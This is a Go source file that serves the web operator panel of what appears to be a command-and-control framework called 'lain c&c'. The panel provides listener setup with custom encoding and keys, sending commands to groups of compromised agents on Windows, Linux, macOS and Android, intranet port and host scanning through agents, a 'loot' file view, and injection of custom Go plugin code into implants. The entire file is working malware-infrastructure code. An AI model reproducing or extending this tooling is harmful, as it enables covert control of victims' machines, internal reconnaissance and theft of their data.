package web_ui

import (
	"fmt"
	"net/http"
)

func Lain(error_str, web_title, web_js, web_css, web_route string, sessionSlice []string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
        //必须先登录
        _, ok := CheckUserSession(r, sessionSlice, error_str)
        if !ok {
            w.WriteHeader(http.StatusNotFound)
            fmt.Fprint(w, error_str)
            return
        }

        if r.Method == http.MethodGet {
            html := fmt.Sprintf(`
            <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>%s</title>
    <link rel="stylesheet" href="/`+web_css+`">
    <link rel="icon" href="favicon.ico" type="image/x-icon">
</head>
<body>
    <script src="/`+web_js+`"></script>
    <div class="server_index">
        <div class="container">
            <div class="sidebar">
                <button class="toggle-button" onclick="toggleSidebar()"><</button>
                <p class='sidebar-title'>lain c&c</p>
                <a href="#" data-target="server">
                    <span class="icon">🎛️</span><span class="text">server</span>
                </a>
                <a href="#" data-target="index">
                    <span class="icon">📶</span><span class="text">Listeners</span>
                </a>
                <a href="#" data-target="userIndex">
                    <span class="icon">💬</span><span class="text">Agents</span>
                </a>
                <a href="#" data-target="net">
                    <span class="icon">🔗</span><span class="text">intranet</span>
                </a>
                <a href="#" data-target="file">
                    <span class="icon">📂</span><span class="text">Files</span>
                </a>
            </div>
            <div class="content">
                <button id="tel-toggleBtn" class="tel-toggleBtn">list</button>
                <div class="tle-sidebar" id="tle-sidebar">
                    <a href="#" data-target="server">🎛️ server</a>
                    <a href="#" data-target="index">📶 Listeners</a>
                    <a href="#" data-target="userIndex">💬 Agents</a>
                    <a href="#" data-target="net">🔗 intranet</a>
                    <a href="#" data-target="file">📂 Files</a>
                </div>
                <div id="server" class="hidden">
                    <div class="net_scan">
                        <button class="startBtn" type="button" onclick="openStartServerDialog()">start</button>
                        <button class="clearMemoryBtn" type="button" onclick="clearMemory()">ClearMemory</button>
                        <button class="logBtn" type="button" onclick="downLog()">downLoadLog</button>
                    </div>
                    <div id="server_index"></div>
                    <script>
                        function downLog() {
                            // 下载 lain.log 日志文件
                            const url = window.location.protocol + "//" + window.location.host + "/`+web_route+`?op=downloadlog";
                            const a = document.createElement("a");
                            a.href = url;
                            a.download = "server.log";
                            document.body.appendChild(a);
                            a.click();
                            document.body.removeChild(a);
                        }
                        function openStartServerDialog() {
                            if (document.getElementById("serverDialog")) {
                                const dialog = document.getElementById("serverDialog");
                                dialog.style.display = "block";
                                requestAnimationFrame(() => {
                                    dialog.style.transform = "translateX(-50%) scaleY(1)";
                                    dialog.style.opacity = "1";
                                });
                                return;
                            }
                            var dialog = document.createElement("div");
                            dialog.id = "serverDialog";
                            dialog.className = "serverDialog";
                            dialog.style.display = "block";
                            var formHtml = '' +
                                '<h3>start server</h3>' +
                                '<form id="serverForm" method="POST">' +
                                    '<input name="port" placeholder="Port" required><br>' +
                                    '<input name="path" placeholder="Path" required><br>' +
                                    '<input name="connPath" placeholder="Conn Path"><br>' +
                                    '<input name="msgPath" placeholder="Msg Path"><br>' +
                                    '<input name="switch_key" placeholder="switch path"><br>' +
                                    '<input name="encry_key" placeholder="Key path"><br>' +
                                    '<input name="download" placeholder="Download path"><br>' +
                                    '<input name="result" placeholder="Result path"><br>' +
                                    '<input name="net" placeholder="Net path"><br>' +
                                    '<input name="info" placeholder="Info path"><br>' +
                                    '<input name="upload" placeholder="Upload path"><br>' +
                                    '<input name="list" placeholder="List path"><br>' +
                                    '<input name="remark" placeholder="Remark"><br>' +
                                    '<select id="protocol" name="protocol">' +
                                        '<option value="">select</option>' +
                                        '<option value="http">HTTP</option>' +
                                        '<option value="https">HTTPS</option>' +
                                    '</select><br>' +
                                    '<select id="Group_pro" name="Group_pro">' +
                                        '<option value="">Normal Version</option>' +
                                        '<option value="group_pro">Windows Enhanced Version</option>' +
                                    '</select><br>' +
                                    // 参数自定义
                                    '<input name="option" placeholder="parameter Option"><br>' +
                                    '<input name="uid" placeholder="parameter uid"><br>' +
                                    '<input name="user" placeholder="parameter user"><br>' +
                                    '<input name="hostname" placeholder="parameter hostname"><br>' +
                                    '<input name="keyPart" placeholder="parameter keyPart"><br>' +
                                    '<input name="filekey" placeholder="parameter filekey"><br>' +
                                    // Base64编码表选择
                                    '<label for="base_rounds_mode">Base64 Table:</label>' +
                                    '<select id="base_rounds_mode" name="base_rounds_mode" onchange="toggleBaseRoundsInput()">' +
                                        '<option value="auto">Auto Generate</option>' +
                                        '<option value="custom">Custom</option>' +
                                    '</select><br>' +
                                    '<input name="base_rounds" id="base_rounds_input" placeholder="Custom Base64 Table (64 characters)" style="display:none;"><br>' +
                                    '<textarea name="cert" placeholder="Cert Content"></textarea><br>' +
                                    '<textarea name="key" placeholder="Key Content"></textarea><br>' +
                                    '<button type="button" id="submitBtn" onclick="startServer()">send</button>' +
                                    '<button type="button" onclick="closeStartServerDialog()">close</button>' +
                                '</form>';
                            dialog.innerHTML = formHtml;
                            var container = document.getElementById("server_index");
                            container.appendChild(dialog);
                            dialog.style.transform = "translateX(-50%) scaleY(0)";
                            dialog.style.opacity = "0";
                            requestAnimationFrame(function () {
                                dialog.style.transform = "translateX(-50%) scaleY(1)";
                                dialog.style.opacity = "1";
                            });

                            // 添加Base64编码表选择的显示/隐藏逻辑
                            window.toggleBaseRoundsInput = function() {
                                var mode = document.getElementById('base_rounds_mode').value;
                                var input = document.getElementById('base_rounds_input');
                                input.style.display = (mode === 'custom') ? '' : 'none';
                            };
                        }
                        function plugin(remark) {
                            if (!remark || remark.trim() === "") {
                                alert("Please enter a remark for the plugin!");
                                return;
                            }
                            const form = document.getElementById('pluginForm');
                            const os = document.getElementById('select_os')?.value;
                            if (!os) {
                                alert("Please select an OS!");
                                return;
                            }

                            const codeWordInput = form.querySelector('input[name="codeWord"]');
                            const codeInput = form.querySelector('input[name="code"]');
                            const parameterDecInput = document.getElementById('parameterDec');
                            const paramCountInput = form.querySelector('#parameterHidden');

                            if (!codeWordInput || !codeInput || !parameterDecInput || !paramCountInput) {
                                alert("Missing required plugin form fields!");
                                return;
                            }

                            var codeWord = codeWordInput.value.trim();
                            var code = codeInput.value.trim();
                            var parameterDec = parameterDecInput.value.trim();
                            var paramCount = parseInt(paramCountInput.value);

                            if (codeWord === "" || code === "" || isNaN(paramCount) || paramCount < 1) {
                                alert("Please complete all plugin fields (codeWord, code, and at least 1 parameter)!");
                                return;
                            }
                            // 处理 parameterDec 为数组（允许空项）
                            var parameterDecArray = parameterDec.split(',').map(function(p) {
                                return p.trim();
                            });
                            while (parameterDecArray.length < paramCount) {
                                parameterDecArray.push("null");
                            }
                            parameterDec = parameterDecArray.join(',');
                            // 生成 msg1, msg2, ...
                            var codeParts = [];
                            for (var i = 1; i <= paramCount; i++) {
                                codeParts.push('msg' + i);
                            }

                            // 生成函数参数列表：msg1 string, msg2 string ...
                            var funcParams = codeParts.map(function(p) {
                                return p + ' string';
                            }).join(', ');

                            // 生成调用参数：msg[1], msg[2] ...
                            var callParams = codeParts.map(function(_, idx) {
                                return 'msg[' + (idx + 1) + ']';
                            }).join(', ');

                            // 替换 msg-1、msg-2 形式为 msg1、msg2
                            for (var i = 1; i <= paramCount; i++) {
                                var regex = new RegExp('msg-' + i, 'g');
                                code = code.replace(regex, 'msg' + i);
                            }

                            // 构造最终代码
                            var finalCode = 'case "' + codeWord + '":\n    go func(' + funcParams + ') {' + code + '}(' + callParams + ')';

                            // 构造 payload
                            var payload = {
                                remark: remark,
                                codeWords: codeWord,
                                parameter: codeParts.join(','),
                                parameterDesc: parameterDec,
                                code: finalCode,
                                os: os
                            };
                            console.log(payload);

                            console.log("[DEBUG] Sending payload:", payload);

                            // 发送到服务端
                            fetch('/`+web_route+`?op=insertPlugin', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(payload)
                            })
                            .then(function(response) {
                                if (!response.ok) {
                                    return response.text().then(function(text) {
                                        throw new Error(text);
                                    });
                                }
                                return response.text();
                            })
                            .then(function(data) {
                                alert('[✔] Plugin success: ' + data);
                                form.reset();

                                var dialog = document.getElementById("serverDialog");
                                if (dialog) {
                                    dialog.style.transform = "translateX(-50%) scaleY(0)";
                                    dialog.style.opacity = "0";
                                    setTimeout(function() {
                                        dialog.style.display = "none";
                                    }, 300);
                                }
                            })
                            .catch(function(error) {
                                console.error('[✘] Plugin fail: ' + error.message);
                                alert('[✘] send error' + error.message);
                            });
                        }

                        function closeStartServerDialog() {
                            var dialog = document.getElementById("serverDialog");
                            if (dialog) {
                                dialog.style.transform = "translateX(-50%) scaleY(0)";
                                dialog.style.opacity = "0";
                                setTimeout(function () {
                                    dialog.parentNode.removeChild(dialog);
                                }, 300);
                            }
                        }
                        const server = new lain_server();
                        server.get_server();
                        server.checkTime();
                        function startServer(){
                            server.start_server();
                        }
                        function clearMemory() {
                            server.clear_memory();
                        }
                    </script>
                </div>
                <div id="index" class="hidden">
                        <p id='div_conn'></p>
                        <script>
                            const l_index = new index();
                            l_index.lainShell();
                            shell_list = [];
                            function get_conn(uid, shellname) {
                                if (shell_list.includes(uid)) {
                                    let ms = confirm("just a sec……");
                                    if (ms) {
                                        setTimeout(() => {
                                            l_index.get(uid, shellname);
                                        }, 60000);
                                    }
                                    return;
                                }
                                l_index.get(uid, shellname);
                                shell_list.push(uid);
                            }
                            function del_conn(uid) {
                                l_index.del(uid);
                            }
                        </script>
                </div>
                <div id="userIndex" class="hidden">
                <div style="margin-left: 50px;">
                    <input type="text" id="cmd_value" placeholder="group Commnad">
                    <label for='options'>platform:</label>
                    <select id='options' name='options'>
                        <option value=''>select</option>
                        <option value='win'>Windows</option>
                        <option value='linux'>Linux</option>
                        <option value='macos'>MacOs</option>
                        <option value='android'>Android</option>
                    </select>
                    <button type="button" onclick="getAll()">Send</button>
                </div>
                        <p id='div_index'></p>
                        <script>
                            const _index = new lain_index();
                            _index.lain_shell()
                            _index.checkTime()
                            function get(shell){
                                _index.get(shell)
                            }
                            function del(shell){
                                _index.del(shell)
                            }
                            function switchVer(shell,ver){
                                _index.switchVer(shell,ver)
                            }   
                            function getAll(){
                                let shell = document.getElementById('cmd_value').value;
                                let options = document.getElementById('options').value;
                                _index.getAll(options,shell)
                            }
                            function remarks(shell){
                                _index.remarks(shell)
                            }
                            function rate(shell){
                                _index.rate(shell)
                            }
                            function saveInfo(uid){
                                _index.saveInfo(uid)
                            }
                        </script>
                </div>
                <div id="net" class="hidden">
                    <div class="net_scan">
                        <select name="net_shell" id="net_shell">
                            <option value="">Select</option>
                        </select>
                        <div id="net_uid"></div>
                        <div id="have_ip"></div>
                    </div>
                    <div class="net_scan">
                        <select id='net_options' name='net_options'>
                            <option value=''>option</option>
                            <option value='scan'>Scan port</option>
                            <option value='sniff'>Scan host</option>
                        </select>
                        <input type="text" id="net_target" placeholder="Target">
                        <input type="text" id="net_target_list" placeholder="[range(1,20,45...)or(1-65534)]">
                        <select name="sleep_time" id="net_sleep_time" onchange="checkCustomOption(this)">
                            <option value="">Select scanning delay time</option>
                            <option value="1">1</option>
                            <option value="2">2</option>
                            <option value="3">3</option>
                            <option value="4">4</option>
                            <option value="5">5</option>
                            <option value="custom">customize</option>
                        </select>
                        <input type="text" id="custom_sleep_time" placeholder="Enter custom time" style="display:none;" />
                        <button onclick="net_send()">Send</button>
                    </div>
                    <div id="net_div" class="net_div"></div>
                    <script>
                        const net = new lain_net();
                        net.getNet();
                        function checkCustomOption(select) {
                            var customInput = document.getElementById('custom_sleep_time');
                            if(select.value === 'custom') {
                                customInput.style.display = 'inline';
                                customInput.focus();
                            } else {
                                customInput.style.display = 'none';
                            }
                        }
                        function net_send(){
                            net.scan()
                        }
                        const selectElement = document.getElementById('net_shell');
                        selectElement.addEventListener('change', function() {
                            net.getshellip();
                        });
                    </script>
                </div>
                <div id="file" class="hidden">
                    <div id="g_file"></div>
                    <script>
                        const loot = new lain_index();
                        function Get_loot(){
                            loot.getloot();
                        }
                        Get_loot()
                    </script>
                </div>        
            </div>
        </div>
        <div id="log" class="log">
            <div class="resize-handle"></div>
            <div id="log-content">
            </div>
        </div>
    </div>
    <div id="iframePanel" class="iframe-panel">
        <div class="drag-handle"></div>
        <button class="close-button" onclick="closeIframe()">x</button>
        <iframe id="iframe" src=""></iframe>
    </div>
    <script src="/`+web_js+`"></script>
</body>
</html>
            `,web_title)
			w.Header().Set("Content-Type", "text/html")
			fmt.Fprint(w, html)
			return
		}
	}
}